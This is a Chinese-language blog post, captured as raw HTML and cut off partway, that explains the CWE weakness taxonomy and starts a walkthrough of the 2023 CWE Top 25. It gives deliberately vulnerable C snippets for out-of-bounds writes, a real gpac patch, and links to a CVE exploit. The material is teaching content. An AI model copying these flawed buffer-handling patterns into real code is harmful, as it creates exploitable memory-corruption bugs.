<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/268aef745a7b3740.css" crossorigin="" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/34565287a23191ed.css" crossorigin="" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-e1a5f2ba60e36b85.js" crossorigin=""/><script src="/_next/static/chunks/fd9d1056-e278622fa62dc0bf.js" async="" crossorigin=""></script><script src="/_next/static/chunks/69-faab496ef6116e58.js" async="" crossorigin=""></script><script src="/_next/static/chunks/main-app-ed6799cd4e1df27b.js" async="" crossorigin=""></script><script src="/_next/static/chunks/457b8330-b5c9cf3fcf214847.js" async=""></script><script src="/_next/static/chunks/d3ac728e-0c798b3b8aa3bf53.js" async=""></script><script src="/_next/static/chunks/250-0ef8476c0fa8ee24.js" async=""></script><script src="/_next/static/chunks/612-fa632c1349770315.js" async=""></script><script src="/_next/static/chunks/551-19232c47cd1e883a.js" async=""></script><script src="/_next/static/chunks/842-812b9489b5c7f4d9.js" async=""></script><script src="/_next/static/chunks/app/%5B...slug%5D/page-5eb8e12f7c16248f.js" async=""></script><script src="/_next/static/chunks/app/page-8a7b32c8a4befa3e.js" async=""></script><script src="/_next/static/chunks/app/layout-8f33aca7be8ff34b.js" async=""></script><script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY"></script><title>Learn CWEs &amp; Real-word Examples - 铃木的网络日记</title><link rel="canonical" href="https://1kuzus.github.io/24b/learn-cwes/"/><link rel="icon" href="/favicon.ico" type="image/x-icon"/><script>
window.dataLayer = window.dataLayer || [];
function gtag() {
    dataLayer.push(arguments);
}
gtag('js', new Date());
gtag('config', 'G-45BYSZ6WPY');
</script><script>const a=z=>h.getItem(z),b=(y,z)=>h.setItem(y,z),c=(y,z)=>document.documentElement.setAttribute(y,z),d='theme',e='dark',f='light',g='class',h=localStorage;a(d)!==e&&a(d)!==f&&b(d,f);a(d)===e?c(g,e):c(g,f);</script><script>
if (!Array.prototype.findLast) {
    Array.prototype.findLast = function (callback) {
        for (let i = this.length - 1; i >= 0; i--) {
            if (callback(this[i])) return this[i];
        }
        return undefined;
    };
}
if (!Array.prototype.findLastIndex) {
    Array.prototype.findLastIndex = function (callback) {
        for (let i = this.length - 1; i >= 0; i--) {
            if (callback(this[i])) return i;
        }
        return -1;
    };
}
</script><script src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" crossorigin="" noModule=""></script></head><body><div id="header"><div id="header-left-wrapper"><a href="/"><div id="header-logo-bg"><svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 1560 1560"><path fill="#00A8C4" d="M644 97h273l272 683H916z"></path><path fill="#30303C" d="M98 97h273l409 1024L1189 97h273L916 1462H644z"></path><path fill="#00F8FF" d="M98 1462 643 97h273L371 1462z"></path></svg></div></a></div><div id="header-right-wrapper"><button id="header-show-sidebar-button" class="header-button-bg"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024"><rect fill="#FCFCFC" x="100" y="148" width="824" height="128" rx="64"></rect><rect fill="#FCFCFC" x="100" y="448" width="824" height="128" rx="64"></rect><rect fill="#FCFCFC" x="100" y="748" width="824" height="128" rx="64"></rect></svg></button><button class="header-button-bg"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-dark-theme-icon"><path d="M525 939h-4a440 440 0 0 1-314-135 446 446 0 0 1-11-597A432 432 0 0 1 367 90a43 43 0 0 1 45 9 43 43 0 0 1 10 43 358 358 0 0 0 83 376 361 361 0 0 0 377 83 43 43 0 0 1 54 55 433 433 0 0 1-100 155 439 439 0 0 1-311 128z" fill="#FCFCFC"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-light-theme-icon"><path d="M512 61c13 0 25 8 30 20l28 68c11 29-5 62-36 73a66 66 0 0 1-22 3c-34 0-61-25-61-56 0-7 1-14 3-20l28-68c5-12 17-20 30-20zm0 902c-13 0-25-8-30-20l-28-68a53 53 0 0 1-3-20c0-31 27-56 61-56a66 66 0 0 1 22 3c31 11 47 44 36 73l-28 68c-5 12-17 20-30 20zm451-451c0 13-8 25-20 30l-68 28c-29 11-62-5-73-36a66 66 0 0 1-3-22c0-34 25-61 56-61 7 0 14 1 20 3l68 28c12 5 20 17 20 30zm-902 0c0-13 8-25 20-30l68-28a53 53 0 0 1 20-3c31 0 56 27 56 61a66 66 0 0 1-3 22 57 57 0 0 1-73 36l-68-28c-12-5-20-17-20-30zm132-319c10-9 24-12 35-7l68 28c29 13 41 47 26 77a66 66 0 0 1-13 18c-24 24-61 26-83 4a53 53 0 0 1-12-17l-28-68c-5-11-2-25 7-35zm638 638c-10 9-24 12-35 7l-68-28a53 53 0 0 1-17-12c-22-22-20-59 4-83a66 66 0 0 1 18-13c30-15 64-3 77 26l28 68c5 11 2 25-7 35zm0-638c9 10 12 24 7 35l-28 68a56 56 0 0 1-77 26 66 66 0 0 1-18-13c-24-24-26-61-4-83 5-5 11-9 17-12l68-28c11-5 25-2 35 7zM193 831c-9-10-12-24-7-35l28-68a53 53 0 0 1 12-17c22-22 59-20 83 4a66 66 0 0 1 13 18c15 30 3 64-26 77l-68 28c-11 5-25 2-35-7zm319-94a225 225 0 1 1 0-450 225 225 0 0 1 0 450z" fill="#FCFCFC"></path></svg></button><a href="https://github.com/1kuzus/1kuzus.github.io" target="_blank" rel="noreferrer"><div class="header-button-bg"><svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 1024 1024"><path d="M411 831c4-5 7-10 7-12v-70c-106 22-128-44-128-44-17-45-43-56-43-56-34-24 4-24 4-24 37 3 58 39 58 39 34 58 89 41 111 32 3-24 13-41 24-51-86-10-174-43-174-188 0-41 15-75 39-102-4-10-17-48 3-101 0 0 33-10 104 40 31-9 64-12 96-12s65 5 96 12c73-50 104-40 104-40 20 53 8 91 3 101 24 27 39 60 39 102 0 145-88 178-174 188 14 12 26 34 26 70v104c0 4 2 7 7 12 5 7 3 19-4 24-3 2-7 3-10 3H425c-10 0-17-6-17-17 0-5 2-8 3-10z" fill="#FCFCFC"></path></svg></div></a></div></div><div id="contents"><h4 id="contents-header">本页目录</h4></div><div id="post-layout"><div id="main" class="center-wrapper"><h1 class="post-title">Learn CWEs &amp; Real-word Examples</h1><div class="post-meta"><code class="not-loaded">null likes<!-- --> · </code><code class="not-loaded">null views<!-- --> · </code><code>2024-06-07</code></div><!--$--><h2 class="x-h1"><a href="https://cwe.mitre.org/index.html" target="_blank" rel="noreferrer">关于CWE</a></h2><p class="x-p"><span class="x-inline-strong">通用缺陷枚举</span><code class="x-inline-highlight">(Common Weakness Enumeration, CWE)</code>是针对硬件和软件弱点和漏洞的分类系统。该项目由美国国土安全部（DHS）网络安全和基础设施安全局（CISA）办公室赞助，由MITRE公司运营。</p><p class="x-p">相比于CVE记录描述产品中出现的漏洞，侧重于漏洞利用的技术影响，CWE对可能导致漏洞的常见缺陷或弱点进行分类，描述漏洞发生的根本原因。</p><h3 class="x-h2">术语</h3><p class="x-p">下面的内容译自<a href="https://cwe.mitre.org/documents/glossary/" target="_blank" rel="noreferrer" class="x-inline-link">CWE Glossary</a>，这里只列出了几个下文可能出现的术语：</p><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p"><code class="x-inline-highlight">Behaviour</code>（行为）：</p><p class="x-p">产品采取的操作，通常以代码实现或以算法表示。也可以指系统以外的其他参与者的操作。</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p"><code class="x-inline-highlight">Resource</code>（资源）：</p><p class="x-p">指在产品运行过程中被访问或修改的对象或实体，例如内存、CPU、文件或套接字。资源可以是系统级（内存或CPU）、代码级（函数或变量）或应用程序级（cookie或消息）。</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p"><code class="x-inline-highlight">Property</code>（属性）：</p><p class="x-p">指某个对系统预期的安全模型很重要的资源或行为，可能随时间变化。比如用户的输入最初是不受信任的，但经过系统的中和处理后，最终会被认为是受信任的。</p></div></div><h3 class="x-h2">CWE分类系统</h3><p class="x-p">CWE有一套树型的分类系统，CWE提供了一些组织各个条目的结构化描述，例如视图和分类。</p><p class="x-p">CWE Views是针对特定目的或特定受众而组织的弱点集合，大多数视图是整个CWE列表的子集。例如<a href="https://cwe.mitre.org/data/index.html" target="_blank" rel="noreferrer" class="x-inline-link">CWE List</a>中给出的：</p><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><a href="https://cwe.mitre.org/data/definitions/699.html" target="_blank" rel="noreferrer" class="x-inline-link">View by Software Development</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><a href="https://cwe.mitre.org/data/definitions/1194.html" target="_blank" rel="noreferrer" class="x-inline-link">View by Hardware Design</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><a href="https://cwe.mitre.org/data/definitions/1000.html" target="_blank" rel="noreferrer" class="x-inline-link">View by Research Concepts</a></p></div></div><p class="x-p">CWE Categories是更细的划分，一个CWE分类可能包含一系列具有共同特征的CWE条目。</p><p class="x-p">CWE的不同条目也具有不同的抽象程度，有些条目描述了具体的缺陷，有些则描述了更一般的问题。CWE的条目之间也存在父级子级的关系。四种抽象程度如下图所示：</p><img alt="img" loading="lazy" width="750" height="375" decoding="async" data-nimg="1" class="x-image x-image-invert" style="color:transparent;width:600px;height:auto" src="/_next/static/media/weakness_abstractions.97b6ed03.png"/><p class="x-p">这些分级在官网上也有对应的图标表示，相应的释义为：</p><div class="x-table-wrapper"><table class="x-table"><tbody><tr><th><p>icon</p></th><th class="x-cell-align-l"><p>释义</p></th></tr><tr><td><img alt="img" loading="lazy" width="16" height="16" decoding="async" data-nimg="1" class="x-image" style="color:transparent;width:16px;height:auto" src="/_next/static/media/view.8fe42818.png"/></td><td class="x-cell-align-l"><p><code class="x-inline-highlight">View</code>，视图。</p></td></tr><tr><td><img alt="img" loading="lazy" width="16" height="16" decoding="async" data-nimg="1" class="x-image" style="color:transparent;width:16px;height:auto" src="/_next/static/media/category.e9fedbc2.png"/></td><td class="x-cell-align-l"><p><code class="x-inline-highlight">Category</code>，分类，一系列有共同特征的CWE条目。</p></td></tr><tr><td><img alt="img" loading="lazy" width="16" height="16" decoding="async" data-nimg="1" class="x-image" style="color:transparent;width:16px;height:auto" src="/_next/static/media/pillar.cf3ad8b9.png"/></td><td class="x-cell-align-l"><p><code class="x-inline-highlight">Pillar</code>，最抽象的CWE条目类型，但与<code class="x-inline-highlight">Category</code>相比，仍然是从“技术上”对缺陷类型进行描述。</p></td></tr><tr><td><img alt="img" loading="lazy" width="16" height="16" decoding="async" data-nimg="1" class="x-image" style="color:transparent;width:16px;height:auto" src="/_next/static/media/class.1556d186.png"/></td><td class="x-cell-align-l"><p><code class="x-inline-highlight">Class</code>，较为抽象的CWE条目类型，通常独立于特定的语言或技术。<br/><code class="x-inline-highlight">Class</code>级别的CWE通常从【行为、属性、资源】中的<code class="x-inline-highlight">1</code>~<code class="x-inline-highlight">2</code>个方面来描述问题。</p></td></tr><tr><td><img alt="img" loading="lazy" width="16" height="16" decoding="async" data-nimg="1" class="x-image" style="color:transparent;width:16px;height:auto" src="/_next/static/media/base.3bd27416.png"/></td><td class="x-cell-align-l"><p><code class="x-inline-highlight">Base</code>，较为抽象的CWE条目类型，通常也是独立于资源或技术。<br/><code class="x-inline-highlight">Base</code>级别的CWE通常从【行为、属性、技术、语言、资源】中的<code class="x-inline-highlight">2</code>~<code class="x-inline-highlight">3</code>个方面来描述问题。</p></td></tr><tr><td><img alt="img" loading="lazy" width="16" height="16" decoding="async" data-nimg="1" class="x-image" style="color:transparent;width:16px;height:auto" src="/_next/static/media/variant.5e0aad12.png"/></td><td class="x-cell-align-l"><p><code class="x-inline-highlight">Variant</code>，通常与特定种类的产品有关系，一般包含特定的语言或技术。<br/><code class="x-inline-highlight">Variant</code>级别的CWE通常从【行为、属性、技术、语言、资源】中的<code class="x-inline-highlight">3</code>~<code class="x-inline-highlight">5</code>个方面来描述问题。</p></td></tr><tr><td><img alt="img" loading="lazy" width="15" height="14" decoding="async" data-nimg="1" class="x-image" style="color:transparent;width:16px;height:auto" src="/_next/static/media/composite.7f43b0e2.png"/></td><td class="x-cell-align-l"><p><code class="x-inline-highlight">Composite</code>，此类缺陷需要多种缺陷同时存在，才会引发潜在的安全漏洞。数量较少。</p></td></tr><tr><td><img alt="img" loading="lazy" width="30" height="10" decoding="async" data-nimg="1" class="x-image" style="color:transparent;width:30px;height:auto" src="/_next/static/media/chain.263402c0.png"/></td><td class="x-cell-align-l"><p><code class="x-inline-highlight">Chain</code>，呈链式关系，例如缺陷X为缺陷Y的发生创造了条件。数量较少。<br/><code class="x-inline-highlight">Chain</code>可以涉及两个以上的弱点，在某些情况下也可能具有树状结构。</p></td></tr></tbody></table></div><h2 class="x-h1">View of CWE Top 25 (2023)</h2><p class="x-p">（2023年）前25个最危险的软件缺陷，按顺序排名。标题前的【<code class="x-inline-highlight">P</code>/<code class="x-inline-highlight">C</code>/<code class="x-inline-highlight">B</code>/<code class="x-inline-highlight">V</code>/<code class="x-inline-highlight">Compo</code>】标识了其抽象类型。</p><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/787.html" target="_blank" rel="noreferrer">【B】CWE-787: Out-of-bounds Write</a></h3><p class="x-p">越界写入，在预期缓冲区末尾之后或开头之前写入。</p><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">int</span> id_sequence<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">/* Populate the id array. */</span>

id_sequence<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>
id_sequence<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">234</span><span class="token punctuation">;</span>
id_sequence<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">345</span><span class="token punctuation">;</span>
id_sequence<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">写入<code class="x-inline-highlight">id_sequence[3]</code>越界了。</p><h4 class="x-h3">Example 2</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">int</span> <span class="token function">returnChunkSize</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">/* if chunk info is valid, return the size of usable memory,
    * else, return -1 to indicate an error.
    */</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>destBuf<span class="token punctuation">,</span> srcBuf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token function">returnChunkSize</span><span class="token punctuation">(</span>destBuf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p"><code class="x-inline-highlight">returnChunkSize()</code>遇到错误会返回<code class="x-inline-highlight">-1</code>，但是<code class="x-inline-highlight">memcpy()</code>假定传入的参数是<code class="x-inline-highlight">unsigned</code>，此时负值会被转换成相当大的数值。</p><h4 class="x-h3">Example 3</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">copy_input</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>user_supplied_string<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">,</span> dst_index<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>dst_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">*</span> MAX_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>MAX_SIZE <span class="token operator">&lt;=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>user_supplied_string<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"user string too long, die evil hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    dst_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>user_supplied_string<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token char">'&amp;'</span> <span class="token operator">==</span> user_supplied_string<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            dst_buf<span class="token punctuation">[</span>dst_index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'&amp;'</span><span class="token punctuation">;</span>
            dst_buf<span class="token punctuation">[</span>dst_index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'a'</span><span class="token punctuation">;</span>
            dst_buf<span class="token punctuation">[</span>dst_index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'m'</span><span class="token punctuation">;</span>
            dst_buf<span class="token punctuation">[</span>dst_index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'p'</span><span class="token punctuation">;</span>
            dst_buf<span class="token punctuation">[</span>dst_index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">';'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token char">'&lt;'</span> <span class="token operator">==</span> user_supplied_string<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token comment">/* encode to &amp;lt; */</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
            dst_buf<span class="token punctuation">[</span>dst_index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_supplied_string<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> dst_buf<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">虽然前面做了长度检查，但是后续的逻辑将<code class="x-inline-highlight">'&'</code>和<code class="x-inline-highlight">'&#60;'</code>转为HTML实体时，可能导致长度增长。如果恶意构造包含大量<code class="x-inline-highlight">'&'</code>的输入，可能导致越界写入。</p><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2023-0841" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2023-0841</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code>：<a href="https://github.com/gpac/gpac/issues/2396" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/gpac/gpac/issues/2396</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/gpac/gpac/commit/851560e3dc8155d45ace4b0d77421f241ed71dc4" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/gpac/gpac/commit/851560e3dc8155d45ace4b0d77421f241ed71dc4</a></p></div></div><p class="x-p">补丁：考虑<code class="x-inline-highlight">bytes_skipped</code>。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 48px, var(--bg-transparent-red) 48px 96px, transparent 96px, transparent 96px, var(--bg-transparent-green) 96px 144px, transparent 144px)"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ctx<span class="token operator">-></span>in_seek<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">></span> remain<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">GF_LOG</span><span class="token punctuation">(</span>GF_LOG_WARNING<span class="token punctuation">,</span> GF_LOG_MEDIA<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"[MP3Dmx] truncated frame of size %u (remains %u)\n"</span><span class="token punctuation">,</span> size<span class="token punctuation">,</span> remain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>bytes_skipped <span class="token operator">+</span> size <span class="token operator">></span> remain<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">GF_LOG</span><span class="token punctuation">(</span>GF_LOG_WARNING<span class="token punctuation">,</span> GF_LOG_MEDIA<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"[MP3Dmx] truncated frame of size %u (remains %d)\n"</span><span class="token punctuation">,</span> size<span class="token punctuation">,</span> remain<span class="token operator">-</span>bytes_skipped<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    dst_pck <span class="token operator">=</span> <span class="token function">gf_filter_pck_new_alloc</span><span class="token punctuation">(</span>ctx<span class="token operator">-></span>opid<span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token operator">&amp;</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dst_pck<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> sync<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gf_filter_pck_set_cts</span><span class="token punctuation">(</span>dst_pck<span class="token punctuation">,</span> ctx<span class="token operator">-></span>cts<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gf_filter_pck_set_duration</span><span class="token punctuation">(</span>dst_pck<span class="token punctuation">,</span> nb_samp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gf_filter_pck_set_sap</span><span class="token punctuation">(</span>dst_pck<span class="token punctuation">,</span> GF_FILTER_SAP_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gf_filter_pck_set_framing</span><span class="token punctuation">(</span>dst_pck<span class="token punctuation">,</span> GF_TRUE<span class="token punctuation">,</span> GF_TRUE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ctx<span class="token operator">-></span>byte_offset <span class="token operator">!=</span> GF_FILTER_NO_BO<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">gf_filter_pck_set_byte_offset</span><span class="token punctuation">(</span>dst_pck<span class="token punctuation">,</span> ctx<span class="token operator">-></span>byte_offset <span class="token operator">+</span> bytes_skipped<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">gf_filter_pck_send</span><span class="token punctuation">(</span>dst_pck<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noreferrer">【B】CWE-79: Improper Neutralization of Input During Web Page Generation (&#x27;Cross-site Scripting&#x27;)</a></h3><p class="x-p">跨站脚本攻击。</p><div class="x-highlightblock highlight-background-gray"><p class="x-p">详见<a href="/24b/cross-site-scripting/" target="_blank" rel="noreferrer" class="x-inline-link">Learn XSS</a>。</p></div><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2014-8958" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2014-8958</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/phpmyadmin/phpmyadmin/commit/d32da348c4de2379482a48661ce968a55eebe5c4" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/phpmyadmin/phpmyadmin/commit/d32da348c4de2379482a48661ce968a55eebe5c4</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/phpmyadmin/phpmyadmin/commit/2ffdbf2d7daa0b92541d8b754e2afac555d3ed21" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/phpmyadmin/phpmyadmin/commit/2ffdbf2d7daa0b92541d8b754e2afac555d3ed21</a></p></div></div><p class="x-p">部分补丁的内容：通过<code class="x-inline-highlight">htmlspecialchars()</code>转义为HTML实体。</p><div 